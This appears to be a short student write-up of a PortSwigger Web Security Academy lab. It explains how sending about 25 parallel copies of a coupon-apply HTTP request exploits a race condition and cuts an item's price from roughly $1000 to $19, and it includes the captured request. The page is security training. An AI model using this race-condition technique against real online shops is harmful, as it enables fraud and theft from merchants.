
# lab -1:

**Description :**

This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a **Lightweight L33t Leather Jacket**.

You can log in to your account with the following credentials: `wiener:peter`.

For a faster and more convenient way to trigger the race condition, we recommend that you solve this lab using the [Trigger race conditions](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/ProbeForRaceCondition.bambda) custom action. This is only available in Burp Suite Professional.

**Solution :**

At , first while entering into the page , there is account , we have log-in using the given creds and then at top they have given the coupon code **PROMO20** and then while putting the code and then buy the lightweight L33t Jacket , the cost was about 1000 dollars and then i capture the coupon apply request and then duplicate the 25 tabs and then send the request via parallel tab and then hit , the cost was abut the $19 , and got and lab too solved

```
POST /cart/coupon HTTP/2
Host: 0aaf0025036d04a1804d4e54004e000d.web-security-academy.net
Cookie: session=kxVHfeOEtDusWtkseA24vmJBe2x6AFcm
Content-Length: 52
Cache-Control: max-age=0
Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Origin: https://0aaf0025036d04a1804d4e54004e000d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aaf0025036d04a1804d4e54004e000d.web-security-academy.net/cart
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

csrf=Quhnk5AbAJzKZnZ8dSjc7ysCdjYkcZaY&coupon=PROMO20
```


